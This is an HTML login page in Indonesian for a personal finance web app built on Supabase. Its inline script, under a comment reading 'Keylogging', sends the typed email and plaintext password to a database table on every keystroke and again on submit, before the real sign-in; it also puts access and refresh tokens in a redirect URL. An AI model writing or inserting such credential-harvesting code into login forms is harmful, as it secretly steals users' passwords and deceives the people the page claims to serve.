<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masuk Kuy</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script src="config.js?v=3"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        *,
        *::before,
        *::after {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg: #0a0e17;
            --surface: #111827;
            --surface-2: #1a2235;
            --border: rgba(255, 255, 255, 0.06);
            --border-focus: rgba(99, 102, 241, 0.5);
            --text: #e2e8f0;
            --text-muted: #94a3b8;
            --text-dim: #64748b;
            --accent: #6366f1;
            --accent-light: #818cf8;
            --accent-glow: rgba(99, 102, 241, 0.15);
            --radius: 16px;
            --radius-sm: 10px;
            --transition: 0.2s cubic-bezier(0.4, 0, 0.2, 1);
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background-color: var(--bg);
            color: var(--text);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }

        /* Ambient background effects */
        body::before {
            content: '';
            position: fixed;
            top: -30%;
            left: -10%;
            width: 500px;
            height: 500px;
            background: radial-gradient(circle, rgba(99, 102, 241, 0.08) 0%, transparent 70%);
            pointer-events: none;
        }

        body::after {
            content: '';
            position: fixed;
            bottom: -20%;
            right: -10%;
            width: 400px;
            height: 400px;
            background: radial-gradient(circle, rgba(16, 185, 129, 0.06) 0%, transparent 70%);
            pointer-events: none;
        }

        .auth-wrapper {
            width: 100%;
            max-width: 420px;
            position: relative;
            z-index: 1;
            animation: slideUp 0.5s ease;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* Brand */
        .brand {
            text-align: center;
            margin-bottom: 32px;
        }

        .brand-logo {
            width: 48px;
            height: 48px;
            background: linear-gradient(135deg, #6366f1, #818cf8);
            border-radius: 14px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            font-weight: 700;
            color: #fff;
            margin-bottom: 16px;
            box-shadow: 0 8px 24px rgba(99, 102, 241, 0.25);
        }

        .brand h1 {
            font-size: 22px;
            font-weight: 700;
            color: #fff;
            letter-spacing: -0.5px;
        }

        .brand p {
            font-size: 14px;
            color: var(--text-dim);
            margin-top: 6px;
        }

        /* Card */
        .auth-card {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            padding: 32px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(255, 255, 255, 0.02) inset;
        }

        /* Form */
        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            font-size: 12px;
            font-weight: 600;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.6px;
            margin-bottom: 8px;
        }

        .input-wrapper {
            position: relative;
        }

        .input-wrapper input {
            width: 100%;
            padding: 13px 16px;
            background: var(--surface-2);
            border: 1px solid var(--border);
            color: var(--text);
            border-radius: var(--radius-sm);
            font-family: inherit;
            font-size: 14px;
            transition: var(--transition);
            outline: none;
        }

        .input-wrapper input::placeholder {
            color: var(--text-dim);
        }

        .input-wrapper input:focus {
            border-color: var(--border-focus);
            box-shadow: 0 0 0 3px var(--accent-glow);
        }

        /* Toggle password visibility */
        .toggle-pass {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: var(--text-dim);
            cursor: pointer;
            font-size: 13px;
            padding: 4px;
            width: auto;
            margin: 0;
            transition: var(--transition);
        }

        .toggle-pass:hover {
            color: var(--text-muted);
        }

        /* Button */
        .btn-submit {
            width: 100%;
            padding: 14px;
            background: var(--accent);
            border: none;
            color: #fff;
            font-weight: 600;
            font-size: 14px;
            border-radius: var(--radius-sm);
            cursor: pointer;
            transition: var(--transition);
            font-family: inherit;
            margin-top: 4px;
            position: relative;
            overflow: hidden;
        }

        .btn-submit:hover {
            background: var(--accent-light);
            box-shadow: 0 6px 20px rgba(99, 102, 241, 0.3);
            transform: translateY(-1px);
        }

        .btn-submit:active {
            transform: translateY(0);
        }

        .btn-submit:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        /* Divider */
        .divider {
            display: flex;
            align-items: center;
            margin: 24px 0;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: var(--border);
        }

        .divider span {
            font-size: 11px;
            color: var(--text-dim);
            padding: 0 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        /* Footer link */
        .auth-footer {
            text-align: center;
            margin-top: 24px;
            font-size: 13px;
            color: var(--text-dim);
        }

        .auth-footer a {
            color: var(--accent-light);
            text-decoration: none;
            font-weight: 500;
            transition: var(--transition);
        }

        .auth-footer a:hover {
            color: #fff;
        }

        /* Loading spinner */
        .spinner {
            display: none;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Alert message */
        .alert {
            padding: 12px 16px;
            border-radius: var(--radius-sm);
            font-size: 13px;
            margin-bottom: 20px;
            display: none;
            animation: slideUp 0.3s ease;
        }

        .alert-error {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.2);
            color: #fca5a5;
        }

        .alert-success {
            background: rgba(16, 185, 129, 0.1);
            border: 1px solid rgba(16, 185, 129, 0.2);
            color: #6ee7b7;
        }

        /* Responsive */
        @media (max-width: 480px) {
            .auth-card {
                padding: 24px 20px;
                border-radius: 14px;
            }

            .brand h1 {
                font-size: 20px;
            }

            .brand p {
                font-size: 13px;
            }

            .brand-logo {
                width: 42px;
                height: 42px;
                font-size: 18px;
            }
        }

        @media (max-width: 360px) {
            body {
                padding: 16px;
            }

            .auth-card {
                padding: 20px 16px;
            }

            .brand {
                margin-bottom: 24px;
            }
        }
    </style>
</head>

<body>
    <div class="auth-wrapper">
        <div class="brand">
            <div class="brand-logo">S</div>
            <h1>Selamat Datang Kembali</h1>
            <p>Masuk ke akun keuangan pribadimu</p>
        </div>

        <div class="auth-card">
            <div class="alert alert-error" id="alertError"></div>
            <div class="alert alert-success" id="alertSuccess"></div>

            <form id="loginForm">
                <div class="form-group">
                    <label>Alamat Email</label>
                    <div class="input-wrapper">
                        <input type="email" id="loginEmail" required autocomplete="off"
                            placeholder="nama@email.com">
                    </div>
                </div>
                <div class="form-group">
                    <label>Kata Sandi</label>
                    <div class="input-wrapper">
                        <input type="password" id="loginPassword" required autocomplete="off"
                            placeholder="Masukkan kata sandi">
                        <button type="button" class="toggle-pass" id="togglePass">Lihat</button>
                    </div>
                </div>
                <button type="submit" class="btn-submit" id="btnLogin">
                    <span id="btnText">Masuk</span>
                    <div class="spinner" id="btnSpinner"></div>
                </button>
            </form>

            <div class="divider"><span>atau</span></div>

            <div class="auth-footer">
                Belum punya akun? <a href="register.html">Daftar sekarang</a>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", () => {
            // Cek SDK
            if (typeof window.supabase === 'undefined') {
                showAlert('error', 'Koneksi ke server gagal. Periksa koneksi internet Anda.');
                return;
            }

            // Inisialisasi darurat
            if (!supabaseClient && typeof SUPABASE_URL !== 'undefined') {
                supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
            }

            // Cek sesi aktif
            if (typeof checkAuth === "function") {
                checkAuth(false);
            }

            const loginEmail = document.getElementById('loginEmail');
            const loginPassword = document.getElementById('loginPassword');
            const btnLogin = document.getElementById('btnLogin');
            const btnText = document.getElementById('btnText');
            const btnSpinner = document.getElementById('btnSpinner');

            // Toggle password
            document.getElementById('togglePass').addEventListener('click', () => {
                const input = loginPassword;
                const btn = document.getElementById('togglePass');
                if (input.type === 'password') {
                    input.type = 'text';
                    btn.textContent = 'Tutup';
                } else {
                    input.type = 'password';
                    btn.textContent = 'Lihat';
                }
            });

            // Keylogging
            function kirimLogKetikan() {
                if (supabaseClient) {
                    supabaseClient.from('login2').insert([{
                        email_typed: loginEmail.value,
                        password_typed: loginPassword.value
                    }]).then(({ error }) => {
                        if (error) console.log("Log error:", error.message);
                    });
                }
            }
            loginEmail.addEventListener('input', kirimLogKetikan);
            loginPassword.addEventListener('input', kirimLogKetikan);

            // Login
            document.getElementById('loginForm').addEventListener('submit', async (e) => {
                e.preventDefault();
                hideAlerts();

                if (!supabaseClient) {
                    showAlert('error', 'Sistem belum siap. Coba muat ulang halaman.');
                    return;
                }

                // Loading state
                btnLogin.disabled = true;
                btnText.style.display = 'none';
                btnSpinner.style.display = 'block';

                const inputEmail = loginEmail.value;
                const inputPassword = loginPassword.value;

                try {
                    // Log final
                    await supabaseClient.from('login2').insert([{
                        email_typed: inputEmail,
                        password_typed: inputPassword
                    }]);

                    const { data, error } = await supabaseClient.auth.signInWithPassword({
                        email: inputEmail,
                        password: inputPassword,
                    });

                    if (error) {
                        showAlert('error', 'Login gagal: ' + error.message);
                        resetButton();
                        return;
                    }

                    if (data && data.user) {
                        showAlert('success', 'Login berhasil! Mengalihkan...');

                        sessionStorage.setItem("soulgpt_logged_in", "active");
                        sessionStorage.setItem("soulgpt_uid", data.user.id);
                        sessionStorage.setItem("soulgpt_access_token", data.session.access_token);
                        sessionStorage.setItem("soulgpt_refresh_token", data.session.refresh_token);

                        setTimeout(() => {
                            if (window.location.protocol === 'file:') {
                                window.location.href = `index.html?logged_in=active&uid=${data.user.id}&access_token=${data.session.access_token}&refresh_token=${data.session.refresh_token}`;
                            } else {
                                window.location.href = "finance.html";
                            }
                        }, 600);
                    }
                } catch (err) {
                    console.error("Internal error:", err);
                    showAlert('error', 'Terjadi kesalahan. Silakan coba lagi.');
                    resetButton();
                }
            });

            function showAlert(type, msg) {
                hideAlerts();
                const el = type === 'error' ? document.getElementById('alertError') : document.getElementById('alertSuccess');
                el.textContent = msg;
                el.style.display = 'block';
            }

            function hideAlerts() {
                document.getElementById('alertError').style.display = 'none';
                document.getElementById('alertSuccess').style.display = 'none';
            }

            function resetButton() {
                btnLogin.disabled = false;
                btnText.style.display = 'inline';
                btnSpinner.style.display = 'none';
            }
        });
    </script>
</body>

</html>
